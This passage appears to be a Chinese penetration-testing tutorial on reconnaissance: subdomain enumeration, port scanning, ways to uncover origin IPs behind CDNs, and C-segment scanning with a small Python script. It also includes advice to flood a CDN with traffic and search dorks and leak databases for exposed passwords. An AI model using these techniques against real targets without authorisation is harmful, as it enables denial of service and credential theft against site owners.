href="https://who.is/">https://who.is/</a></p><p>-kali自带的whois查询：whois 域名</p><h2 id="5-在线网站备案查询"><a href="#5-在线网站备案查询" class="headerlink" title="5. 在线网站备案查询"></a>5. 在线网站备案查询</h2><p>网站备案信息是根据国家法律法规规定，由网站所有者向国家有关部门申请的备案，如果需要查询企业备案信息（单位名称、备案编号、网站负责人、电子邮箱、联系电话、法人等），推荐以下网站查询</p><ol><li>天眼查 <a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></li><li>ICP备案查询网<a href="http://www.beianbeian.com/">http://www.beianbeian.com/</a></li><li>爱站备案查询<a href="https://icp.aizhan.com/">https://icp.aizhan.com/</a></li><li>域名助手备案信息查询 <a href="http://cha.fute.com/index">http://cha.fute.com/index</a></li></ol><h2 id="6-收集子域名"><a href="#6-收集子域名" class="headerlink" title="6.收集子域名"></a>6.收集子域名</h2><ol><li>作用</li></ol><p>收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。</p><ol start="2"><li>常用方法</li></ol><p>子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城，其他管理系统，网站管理后台也有可能出现子域名中。</p><p>首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。</p><p>查找目标域名信息的方法有：</p><ol><li>FOFA title=”公司名称”</li><li>百度 intitle=公司名称</li><li>Google intitle=公司名称 </li><li>站长之家，直接搜索名称或者网站域名即可查看相关信息：</li></ol><p><a href="http://tool.chinaz.com/">http://tool.chinaz.com/</a></p><ol start="5"><li>钟馗之眼 site=域名即可</li></ol><p><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p><ol start="3"><li>子域名在线查询</li></ol><p><a href="https://chaziyu.com/">https://chaziyu.com/</a></p><p><a href="https://site.ip138.com/">https://site.ip138.com/</a></p><ol start="4"><li>dns侦测</li></ol><p> <a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></p><ol start="5"><li>子域名扫描工具</li></ol><p>IP138查询子域名、FOFA搜索子域名、Hackertarget查询子域名、<strong>Layer子域名挖掘机</strong>、SubDomainBrute、Sublist3r、OneForALL、<strong>FuzzDomain</strong></p><h3 id="隐藏域名hosts碰撞"><a href="#隐藏域名hosts碰撞" class="headerlink" title="隐藏域名hosts碰撞"></a>隐藏域名hosts碰撞</h3><p>隐藏资产探测-hosts碰撞</p><p><a href="https://mp.weixin.qq.com/s/fuASZODw1rLvgT7GySMC8Q">https://mp.weixin.qq.com/s/fuASZODw1rLvgT7GySMC8Q</a></p><p>很多时候访问目标资产IP响应多为：401、403、404、500，但是用域名请求却能返回正常的业务系统（禁止IP直接访问），因为这大多数都是需要绑定host才能正常请求访问的 （目前互联网公司基本的做法）（域名删除了A记录，但是反代的配置未更新），那么我们就可以通过收集到的目标的 域名 和 目标资产 的IP段组合起来，以 IP段+域名 的形式进行捆绑碰撞，就能发现很多有意思的东西。</p><p>在发送http请求的时候，对域名和IP列表进行配对，然后遍历发送请求 （就相当于修改了本地的hosts文件一样），并把相应的title和响应包大小拿回来做对比，即可快速发现一些隐蔽的资产。</p><p>进行hosts碰撞需要目标的域名和目标的相关IP作为字典</p><p>域名就不说了</p><p>相关IP来源有：</p><p>目标域名历史解析IP</p><p><a href="https://site.ip138.com/">https://site.ip138.com/</a></p><p><a href="https://ipchaxun.com/">https://ipchaxun.com/</a></p><p>ip正则</p><p><a href="https://www.aicesu.cn/reg/">https://www.aicesu.cn/reg/</a></p><h2 id="7-端口扫描"><a href="#7-端口扫描" class="headerlink" title="7.端口扫描"></a>7.端口扫描</h2><h3 id="1-masscan端口扫描"><a href="#1-masscan端口扫描" class="headerlink" title="1.masscan端口扫描"></a>1.masscan端口扫描</h3><p>masscan -p 1-65535 ip –rate=1000</p><h3 id="2-御剑端口扫描工具"><a href="#2-御剑端口扫描工具" class="headerlink" title="2. 御剑端口扫描工具"></a>2. 御剑端口扫描工具</h3><h3 id="3-Nmap端口扫描"><a href="#3-Nmap端口扫描" class="headerlink" title="3.Nmap端口扫描"></a>3.Nmap端口扫描</h3><p>常用参数，如：</p><p>nmap -sV 192.168.0.2对端口上的服务程序版本进行扫描 </p><p>nmap -sT 192.168.0.2TCP连接扫描</p><p>nmap -sS 192.168.96.4  SYN扫描，使用最频繁，安全，快</p><p>nmap -Pn -A -sC 192.168.0.2目标机禁用ping，绕过ping扫描</p><p>nmap -sU -sT -p0-65535 192.168.122.1  </p><table><thead><tr><th align="center">参数</th><th align="center">功能</th><th align="center">参数</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">-sU</td><td align="center">扫描UDP端口</td><td align="center">-sT</td><td align="center">TCP连接扫描，不安全，慢</td></tr><tr><td align="center">-sS</td><td align="center">SYN扫描，使用最频繁，安全，快</td><td align="center">-Pn</td><td align="center">目标机禁用ping，绕过ping扫描</td></tr><tr><td align="center">-A</td><td align="center">强力扫描，耗时长</td><td align="center">-sC</td><td align="center">使用脚本进行扫描，耗时长</td></tr><tr><td align="center">-sP</td><td align="center">仅仅对目标进行ping检测</td><td align="center">-v</td><td align="center">显示冗余信息(扫描细节)</td></tr><tr><td align="center">-O</td><td align="center">对目标主机的操作系统进行扫描</td><td align="center"></td><td align="center"></td></tr></tbody></table><p>用于扫描目标主机服务版本号与开放的端口</p><p>如果需要扫描多个ip或ip段，可以将他们保存到一个txt文件中</p><p>nmap -iL ip.txt</p><p>来扫描列表中所有的ip。</p><p>Nmap为端口探测最常用的方法，操作方便，输出结果非常直观。</p><h3 id="端口表"><a href="#端口表" class="headerlink" title="端口表"></a>端口表</h3><p><img src="https://pic.imgdb.cn/item/66e42774d9c307b7e9e838fd.png"></p><h2 id="8-CDN绕过-查找真实IP"><a href="#8-CDN绕过-查找真实IP" class="headerlink" title="8.CDN绕过 查找真实IP"></a>8.CDN绕过 查找真实IP</h2><p>如果目标网站使用了CDN，使用了cdn真实的ip会被隐藏，如果要查找真实的服务器就必须获取真实的ip，根据这个ip继续查询旁站。</p><p>注意：很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实ip也是一种途径。</p><p>找到真实IP可以继续旁站检测，找其他站点进行突破，也可以绕过cdn进行访问，从而绕过waf针对攻击语句的拦截 发现有攻击语句就会对攻击的IP封堵。 </p><p>方法:</p><h3 id="1-dns历史绑定记录"><a href="#1-dns历史绑定记录" class="headerlink" title="1. dns历史绑定记录"></a>1. dns历史绑定记录</h3><p>通过以下这些网站可以访问dns的解析，有可能存在未有绑cdn之前的记录。</p><p><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a> ###DNS查询</p><p><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a> ###微步在线</p><p><a href="http://viewdns.info/">http://viewdns.info/</a> ###DNS、IP等查询</p><p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a> ###CDN查询IP</p><p><a href="https://sitereport.netcraft.com/?url=%E5%9F%9F%E5%90%8D">https://sitereport.netcraft.com/?url=域名</a></p><h3 id="2-子域名解析"><a href="#2-子域名解析" class="headerlink" title="2.子域名解析"></a>2.子域名解析</h3><p>通过子域名的解析指向也有可能指向目标的同一个IP上。使用工具对其子域名进行穷举</p><p>在线子域名查询：</p><p><a href="https://chaziyu.com/">子域名查询 查子域名 查子站 子域名大全 二级域名查询 查子域 (chaziyu.com)</a></p><p>找到子域名继续确认子域名没有cdn的情况下，批量进行域名解析查询，有cdn的情况继续查询历史。</p><p>域名批量解析：</p><h3 id="3-国外dns获取真实IP"><a href="#3-国外dns获取真实IP" class="headerlink" title="3.国外dns获取真实IP"></a>3.国外dns获取真实IP</h3><p>部分cdn只针对国内的ip访问，如果国外ip访问域名 即可获取真实IP</p><p>全世界DNS地址：</p><p><a href="http://www.ab173.com/dns/dns_world.php">http://www.ab173.com/dns/dns_world.php</a></p><p> <a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a> </p><p><a href="https://dnshistory.org/">https://dnshistory.org/</a> </p><p><a href="http://whoisrequest.com/history/">http://whoisrequest.com/history/</a> </p><p><a href="https://completedns.com/dns-history/">https://completedns.com/dns-history/</a> </p><p><a href="http://dnstrails.com/">http://dnstrails.com/</a> </p><p><a href="https://who.is/domain-history/">https://who.is/domain-history/</a></p><p><a href="http://research.domaintools.com/research/hosting-history/">http://research.domaintools.com/research/hosting-history/</a> <a href="http://site.ip138.com/">http://site.ip138.com/</a> </p><p><a href="http://viewdns.info/iphistory/">http://viewdns.info/iphistory/</a> </p><p><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a> </p><p><a href="https://www.virustotal.com/">https://www.virustotal.com/</a> </p><p><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a> </p><p><a href="http://viewdns.info/">http://viewdns.info/</a> </p><p><a href="http://www.17ce.com/">http://www.17ce.com/</a></p><p> <a href="http://toolbar.netcraft.com/site_report?url=">http://toolbar.netcraft.com/site_report?url=</a> <a href="https://securitytrails.com/">https://securitytrails.com/</a> </p><p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p><h3 id="4-ico图标通过空间搜索找真实ip"><a href="#4-ico图标通过空间搜索找真实ip" class="headerlink" title="4.ico图标通过空间搜索找真实ip"></a>4.ico图标通过空间搜索找真实ip</h3><p><a href="https://www.t00ls.net/favicon.ico">https://www.t00ls.net/favicon.ico</a> 下载图标 放到fofa识别</p><h4 id="1-通过fofa搜图标"><a href="#1-通过fofa搜图标" class="headerlink" title="1.通过fofa搜图标"></a>1.通过fofa搜图标</h4><p>通过这样查询 快速定位资源 查看端口是否开放 这里没有开放</p><h4 id="2-通过zoomeye搜图标"><a href="#2-通过zoomeye搜图标" class="headerlink" title="2.通过zoomeye搜图标"></a>2.通过zoomeye搜图标</h4><h4 id="3-360测绘中心"><a href="#3-360测绘中心" class="headerlink" title="3.360测绘中心"></a>3.360测绘中心</h4><p><a href="https://quake.360.cn/">https://quake.360.cn</a></p><h3 id="5-fofa搜索真实IP"><a href="#5-fofa搜索真实IP" class="headerlink" title="5.fofa搜索真实IP"></a>5.fofa搜索真实IP</h3><p>domain=”t00ls.net” <strong>302</strong>一般是cdn </p><h3 id="6-通过censys找真实ip"><a href="#6-通过censys找真实ip" class="headerlink" title="6.通过censys找真实ip"></a>6.通过censys找真实ip</h3><p>Censys工具就能实现对整个互联网的扫描，Censys是一款用以搜索联网设备信息的新型搜索引擎，能够扫描整个互联网，Censys会将互联网所有的ip进行扫面和连接，以及证书探测。</p><p>若目标站点有https证书，并且默认虚拟主机配了https证书，我们就可以找所有目标站点是该https证书的站点。</p><h3 id="7-360测绘中心"><a href="#7-360测绘中心" class="headerlink" title="7.360测绘中心"></a>7.360测绘中心</h3><h3 id="8-利用SSL证书寻找真实IP"><a href="#8-利用SSL证书寻找真实IP" class="headerlink" title="8.利用SSL证书寻找真实IP"></a>8.利用SSL证书寻找真实IP</h3><p>证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中，SSL/TLS证书通常包含域名、子域名和电子邮件地址。因此SSL/TLS证书成为了攻击者的切入点。</p><p>思路：获取网站SSL证书的HASH再结合Censys</p><ol><li><p>在<a href="https://crt.sh上查找目标网站ssl证书的hash,利用censys搜索网站的ssl证书及hash,/">https://crt.sh上查找目标网站SSL证书的HASH，利用Censys搜索网站的SSL证书及HASH，</a></p></li><li><p>再用Censys搜索该HASH即可得到真实IP地址</p></li></ol><p><img src="https://pic.imgdb.cn/item/66eae1cbf21886ccc0edbd2b.png"></p><p><img src="https://pic.imgdb.cn/item/66eae1f3f21886ccc0ede41f.png"></p><h3 id="9-邮箱获取真实IP"><a href="#9-邮箱获取真实IP" class="headerlink" title="9.邮箱获取真实IP"></a>9.邮箱获取真实IP</h3><p>网站在发信的时候，会附带真实的IP地址 进入邮箱 查看源文件头部信息 选择from</p><p><img src="https://pic.imgdb.cn/item/66eb7d00f21886ccc064daa6.png"></p><p><img src="https://pic.imgdb.cn/item/66eb7d1df21886ccc064ef00.png"></p><p>是否真实 还需要 邮箱发送是否与网站同一个IP地址。</p><h3 id="10-网站敏感文件获取真实IP"><a href="#10-网站敏感文件获取真实IP" class="headerlink" title="10.网站敏感文件获取真实IP"></a>10.网站敏感文件获取真实IP</h3><ul><li><p>文件探针</p></li><li><p>phpinfo</p></li><li><p>网站源代码</p></li><li><p>信息泄露</p></li><li><p>GitHub信息泄露</p></li><li><p>js文件</p></li></ul><h3 id="11-F5-LTM解码法"><a href="#11-F5-LTM解码法" class="headerlink" title="11.F5 LTM解码法"></a>11.F5 LTM解码法</h3><p>当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，例如：Set-Cookie: BIGipServerpool_8.29_8030=<strong>487098378</strong>.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d 08 88 0a，接着将这个十六进制从后至前取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip。</p><p>例子：</p><p>rverpool-cas01=3255675072.20480.0000; path=/</p><p>3255675072 转十六进制 c2 0d a8 c0 从右向左取 c0 a8 0d c2 转10进制 192 168 13 194（内网IP）</p><h3 id="12-APP获取真实IP"><a href="#12-APP获取真实IP" class="headerlink" title="12.APP获取真实IP"></a>12.APP获取真实IP</h3><p>如果网站有app，使用Fiddler或BurpSuite抓取数据包 可能获取真实IP</p><p>模拟器 mimi模拟器抓包 </p><h3 id="13-配置不当获取真实IP"><a href="#13-配置不当获取真实IP" class="headerlink" title="13.配置不当获取真实IP"></a>13.配置不当获取真实IP</h3><p>在配置CDN的时候，需要指定域名、端口等信息，有时候小小的配置细节就容易导致CDN防护被绕过。</p><p>案例1：为了方便用户访问，我们常常将<a href="http://www.test.com/">www.test.com</a> 和 test.com 解析到同一个站点，而CDN只配置了<a href="http://www.test.com,通过访问test.com,就可以绕过/">www.test.com，通过访问test.com，就可以绕过</a> CDN 了。</p><p>案例2：站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。</p><h3 id="14-banner"><a href="#14-banner" class="headerlink" title="14.banner"></a>14.banner</h3><p>获取目标站点的banner，在全网搜索引擎搜索，也可以使用AQUATONE，在Shodan上搜索相同指纹站点。</p><p>可以通过互联网络信息中心的IP数据，筛选目标地区IP，遍历Web服务的banner用来对比CDN站的banner，可以确定源IP。</p><p>获取CN的IP</p><p><a href="http://www.ipdeny.com/ipblocks/data/countries/cn.zone">http://www.ipdeny.com/ipblocks/data/countries/cn.zone</a> </p><p>例如： </p><p>找到目标服务器 IP 段后，可以直接进行暴力匹配 ，使用zmap、masscan 扫描 HTTP banner，然后匹配到目标域名的相同 banner</p><p>zmap -p 80 -w bbs.txt -o 80.txt</p><p>使用zmap的banner-grab对扫描出来80端口开放的主机进行banner抓取。</p><p>cat /root/bbs.txt |./banner-grab-tcp -p 80 -c 100 -d http-req -f ascii &gt; http-banners.out</p><p>根据网站返回包特征，进行特征过滤</p><p>location: plugin.php?id=info:index</p><p>网络测绘搜索：</p><p><a href="https://fofa.so/">https://fofa.so/</a></p><p>title=”T00LS | 低调求发展 - 潜心习安全 - T00ls.Net”</p><p><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p><p>title:”T00LS | 低调求发展 -潜心习安全 -T00ls.Net”</p><p><a href="https://quake.360.cn/">https://quake.360.cn/</a> </p><p>response:”T00LS | 低调求发展 - 潜心习安全 - T00ls.Net”</p><p>1、ZMap号称是最快的互联网扫描工具，能够在45分钟扫遍全网。<a href="https://github.com/zmap/zmap">https://github.com/zmap/zmap</a></p><p>2、Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。</p><p><a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p><h3 id="15-长期关注"><a href="#15-长期关注" class="headerlink" title="15.长期关注"></a>15.长期关注</h3><p>在长期渗透的时候，设置程序每天访问网站，可能有新的发现。每天零点 或者业务需求增大 它会换ip 换服务器的。</p><h3 id="16-流量攻击"><a href="#16-流量攻击" class="headerlink" title="16.流量攻击"></a>16.流量攻击</h3><p>发包机可以一下子发送很大的流量。</p><p>这个方法是很笨，但是在特定的目标下渗透，建议采用。</p><p>cdn除了能隐藏ip，可能还考虑到分配流量，</p><p>不设防的cdn 量大就会挂，高防cdn 要大流量访问。</p><p><strong>经受不住大流量冲击的时候可能会显示真实ip。</strong></p><p>站长-&gt;业务不正常-&gt;cdn不使用-&gt;更换服务器。</p><h3 id="17-被动获取"><a href="#17-被动获取" class="headerlink" title="17.被动获取"></a>17.被动获取</h3><p>被动获取就是<strong>让服务器或网站主动连接我们的服务器，从而获取服务器的真实IP</strong></p><p>如果网站有编辑器可以填写远程url图片，即可获取真实IP</p><p>如果存在ssrf漏洞 或者xss 让服务器主动连接我们的服务器 均可获取真实IP。</p><h3 id="18-扫全网获取真实IP"><a href="#18-扫全网获取真实IP" class="headerlink" title="18.扫全网获取真实IP"></a>18.扫全网获取真实IP</h3><p><a href="https://github.com/superfish9/hackcdn">https://github.com/superfish9/hackcdn</a></p><p>w8fuckcdn：</p><p><a href="https://github.com/boy-hack/w8fuckcdn">https://github.com/boy-hack/w8fuckcdn</a></p><h2 id="9-旁站和C段"><a href="#9-旁站和C段" class="headerlink" title="9.旁站和C段"></a>9.旁站和C段</h2><p>旁站往往存在业务功能站点，建议先收集已有IP的旁站，再探测C段，确认C段目标后，再在C段的基础上再收集一次旁站。</p><p>旁站是和已知目标站点在同一服务器但不同端口的站点，通过以下方法搜索到旁站后，先访问一下确定是不是自己需要的站点信息。</p><h3 id="1-在线c段-webscan-cc"><a href="#1-在线c段-webscan-cc" class="headerlink" title="1. 在线c段 webscan.cc"></a>1. 在线c段 webscan.cc</h3><p><a href="https://c.webscan.cc/">https://c.webscan.cc/</a></p><h3 id="2-站长之家"><a href="#2-站长之家" class="headerlink" title="2.站长之家"></a>2.站长之家</h3><p><a href="http://stool.chinaz.com/same">http://stool.chinaz.com/same</a></p><h3 id="3-网络空间搜索引擎"><a href="#3-网络空间搜索引擎" class="headerlink" title="3. 网络空间搜索引擎"></a>3. 网络空间搜索引擎</h3><h3 id="4-Nmap-Msscan扫描"><a href="#4-Nmap-Msscan扫描" class="headerlink" title="4.Nmap,Msscan扫描"></a>4.Nmap,Msscan扫描</h3><p>nmap -p 80,443,8000,8080 -Pn 192.168.0.0/24</p><p>C段利用脚本</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">c段利用脚本</span><br><span class="line">pip install requests</span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_c</span>(<span class="params">ip</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"正在收集{}"</span>.<span class="built_in">format</span>(ip))</span><br><span class="line">    url=<span class="string">"http://api.webscan.cc/?action=query&amp;ip={}"</span>.<span class="built_in">format</span>(ip)</span><br><span class="line">    req=requests.get(url=url)</span><br><span class="line">    html=req.text</span><br><span class="line">    data=req.json()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'null'</span> <span class="keyword">not</span> <span class="keyword">in</span> html:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"resulit.txt"</span>, <span class="string">'a'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(ip + <span class="string">'\n'</span>)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"resulit.txt"</span>, <span class="string">'a'</span>,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="string">"\t{} {}\n"</span>.<span class="built_in">format</span>(i[<span class="string">'domain'</span>],i[<span class="string">'title'</span>]))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"     [+] {} {}[+]"</span>.<span class="built_in">format</span>(i[<span class="string">'domain'</span>],i[<span class="string">'title'</span>]))</span><br><span class="line">                f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_ips</span>(<span class="params">ip</span>):</span><br><span class="line">    iplist=[]</span><br><span class="line">    ips_str = ip[:ip.rfind(<span class="string">'.'</span>)]</span><br><span class="line">    <span class="keyword">for</span> ips <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">        ipadd=ips_str + <span class="string">'.'</span> + <span class="built_in">str</span>(ips)</span><br><span class="line">        iplist.append(ipadd)</span><br><span class="line">    <span class="keyword">return</span> iplist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ip=<span class="built_in">input</span>(<span class="string">"请你输入要查询的ip:"</span>)</span><br><span class="line"></span><br><span class="line">ips=get_ips(ip)</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> ips:</span><br><span class="line">    get_c(p)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="10-网络空间搜索引擎"><a href="#10-网络空间搜索引擎" class="headerlink" title="10.网络空间搜索引擎"></a>10.网络空间搜索引擎</h2><p>1、同IP旁站：ip=”192.168.0.1”</p><p>2、C段：ip=”192.168.0.0/24”</p><p>3、子域名：domain=”baidu.com”</p><p>4、标题/关键字：title=”百度”</p><p>5、如果需要将结果缩小到某个城市的范围，那么可以拼接语句</p><p> title=”百度”&amp;&amp; region=”Beijing”</p><p>6、特征：body=”百度”或header=”baidu”</p><h2 id="11-扫描敏感目录-文件"><a href="#11-扫描敏感目录-文件" class="headerlink" title="11.扫描敏感目录/文件"></a>11.扫描敏感目录/文件</h2><p>扫描敏感目录需要强大的字典，需要平时积累，拥有强大的字典能够更高效地找出网站的管理后台，敏感文件常见的如.git文件泄露，.svn文件泄露，phpinfo泄露等，这一步一半交给各类扫描器就可以了，将目标站点输入到域名中，选择对应字典类型，就可以开始扫描了，十分方便。</p><h3 id="1-御剑"><a href="#1-御剑" class="headerlink" title="1. 御剑"></a>1. 御剑</h3><h3 id="2-7kbscan"><a href="#2-7kbscan" class="headerlink" title="2.7kbscan"></a>2.7kbscan</h3><h3 id="3-bbscan"><a href="#3-bbscan" class="headerlink" title="3.bbscan"></a>3.bbscan</h3><h3 id="4-dirsearch"><a href="#4-dirsearch" class="headerlink" title="4.dirsearch"></a>4.dirsearch</h3><h3 id="5-gobuster"><a href="#5-gobuster" class="headerlink" title="5.gobuster"></a>5.gobuster</h3><p>gobuster dir -u <a href="https://www.servyou.com.cn/">https://www.servyou.com.cn/</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 50</p><p>dir -u 网址 w字典 -x 指定后缀 -t 线程数量</p><h2 id="12-网站文件"><a href="#12-网站文件" class="headerlink" title="12.网站文件"></a>12.网站文件</h2><ol><li>robots.txt</li><li>crossdomin.xml</li><li>sitemap.xml      xml网站地图协议</li><li>后台目录</li><li>网站安装包</li><li>网站上传目录</li><li>mysql管理页面</li><li>phpinfo</li><li>网站文本编辑器</li><li>测试文件</li><li>网站备份文件(.rar、zip、.7z、.tar.gz、.bak)</li><li>DS_Store 文件</li><li>vim编辑器备份文件(.swp)</li><li>WEB—INF/web.xml文件</li></ol><p>15 .git</p><p>16 .svn</p><h2 id="13-CMS识别"><a href="#13-CMS识别" class="headerlink" title="13.CMS识别"></a>13.CMS识别</h2><p>收集好网站信息之后，应该对网站进行指纹识别，通过识别指纹，确定目标的cms及版本，方便制定下一步的测试计划，可以用公开的poc或自己累积的对应手法等进行正式的渗透测试。</p><h3 id="13-1-云悉"><a href="#13-1-云悉" class="headerlink" title="13.1 云悉"></a>13.1 云悉</h3><p><a href="http://www.yunsee.cn/">http://www.yunsee.cn</a></p><h3 id="13-2-潮汐指纹"><a href="#13-2-潮汐指纹" class="headerlink" title="13.2 潮汐指纹"></a>13.2 潮汐指纹</h3><p><a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></p><h3 id="13-3-CMS指纹识别"><a href="#13-3-CMS指纹识别" class="headerlink" title="13.3 CMS指纹识别"></a>13.3 CMS指纹识别</h3><p><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p><h3 id="13-4-kali的whatweb"><a href="#13-4-kali的whatweb" class="headerlink" title="13.4 kali的whatweb"></a>13.4 kali的whatweb</h3><h2 id="14-敏感文件搜索"><a href="#14-敏感文件搜索" class="headerlink" title="14.敏感文件搜索"></a>14.敏感文件搜索</h2><h3 id="1-GitHub搜索"><a href="#1-GitHub搜索" class="headerlink" title="1.  GitHub搜索"></a>1.  GitHub搜索</h3><p>in:name test #仓库标题搜索含有关键字test</p><p>in:descripton test #仓库描述搜索含有关键字</p><p>in:readme test #Readme文件搜素含有关键字</p><p>搜索某些系统的密码</p><p><a href="https://github.com/search?q=smtp+58.com+password+3306&amp;type=Code">https://github.com/search?q=smtp+58.com+password+3306&amp;type=Code</a></p><p>github 关键词监控</p><p><a href="https://www.codercto.com/a/46640.html">https://www.codercto.com/a/46640.html</a></p><p>谷歌搜索</p><p>site:Github.com sa password</p><p>site:Github.com root password</p><p>site:Github.com User ID=’sa’;Password</p><p>site:Github.com inurl:sql</p><p>SVN 信息收集</p><p>site:Github.com svn</p><p>site:Github.com svn username</p><p>site:Github.com svn password</p><p>site:Github.com svn username password</p><p>综合信息收集</p><p>site:Github.com password</p><p>site:Github.com ftp ftppassword</p><p>site:Github.com 密码</p><p>site:Github.com 内部</p><p><a href="https://blog.csdn.net/qq_36119192/article/details/99690742">https://blog.csdn.net/qq_36119192/article/details/99690742</a></p><p><a href="http://www.361way.com/github-hack/6284.html">http://www.361way.com/github-hack/6284.html</a></p><p><a href="https://docs.github.com/cn/github/searching-for-information-on-github/searching-code">https://docs.github.com/cn/github/searching-for-information-on-github/searching-code</a></p><p><a href="https://github.com/search?q=smtp+bilibili.com&amp;type=code">https://github.com/search?q=smtp+bilibili.com&amp;type=code</a></p><h3 id="2-Google-hacking"><a href="#2-Google-hacking" class="headerlink" title="2.  Google-hacking"></a>2.  Google-hacking</h3><p>site:域名</p><p>inurl: url中存在的关键字网页</p><p>intext：网页正文中的关键词</p><p>filetype:指定文件类型</p><h3 id="3-wooyun漏洞库"><a href="#3-wooyun漏洞库" class="headerlink" title="3.  wooyun漏洞库"></a>3.  wooyun漏洞库</h3><p><a href="https://wooyun.website/">https://wooyun.website/</a></p><h3 id="4-网盘搜索"><a href="#4-网盘搜索" class="headerlink" title="4.  网盘搜索"></a>4.  网盘搜索</h3><p>凌云搜索 <a href="https://www.lingfengyun.com/">https://www.lingfengyun.com/</a></p><p>盘多多：<a href="http://www.panduoduo.net/">http://www.panduoduo.net/</a></p><p>盘搜搜：<a href="http://www.pansoso.com/">http://www.pansoso.com/</a></p><p>盘搜：<a href="http://www.pansou.com/">http://www.pansou.com/</a></p><h3 id="5-社工库"><a href="#5-社工库" class="headerlink" title="5.  社工库"></a>5.  社工库</h3><p>名字/常用id/邮箱/密码/电话 登录 网盘 网站 邮箱 找敏感信息</p><p>tg机器人</p><h3 id="6-JS敏感信息"><a href="#6-JS敏感信息" class="headerlink" title="6. JS敏感信息"></a>6. JS敏感信息</h3><p>1.网站的url连接写到js里面</p><p>2.js的api接口 里面包含用户信息 比如 账号和密码</p><h4 id="1-jsfinder"><a href="#1-jsfinder" class="headerlink" title="1.jsfinder"></a>1.jsfinder</h4><p>下载地址:<a href="https://gitee.com/kn1fes/JSFinder">https://gitee.com/kn1fes/JSFinder</a></p><p>python JSFinder.py -u <a href="http://www.mi.com/">http://www.mi.com</a></p><p>python JSFinder.py -u <a href="http://www.mi.com/">http://www.mi.com</a> -d</p><p>python JSFinder.py -u <a href="http://www.mi.com/">http://www.mi.com</a> -d -ou mi_url.txt -os mi_subdomain.txt</p><p>当你想获取更多信息的时候，可以使用-d进行深度爬取来获得更多内容，并使用命令 -ou, -os来指定URL和子域名所保存的文件名</p><p>批量指定URL和JS链接来获取里面的URL。</p><p>指定URL：</p><p>python JSFinder.py -f text.txt</p><p>指定JS：</p><p>python JSFinder.py -f text.txt -j</p><h4 id="2-Packer-Fuzzer"><a href="#2-Packer-Fuzzer" class="headerlink" title="2.Packer-Fuzzer"></a>2.Packer-Fuzzer</h4><p>寻找网站交互接口 授权key</p><p>随着WEB前端打包工具的流行，您在日常渗透测试、安全服务中是否遇到越来越多以Webpack打包器为代表的网站？这类打包器会将整站的API和API参数打包在一起供Web集中调用，这也便于我们快速发现网站的功能和API清单，但往往这些打包器所生成的JS文件数量异常之多并且总JS代码量异常庞大（多达上万行），这给我们的手工测试带来了极大的不便，Packer 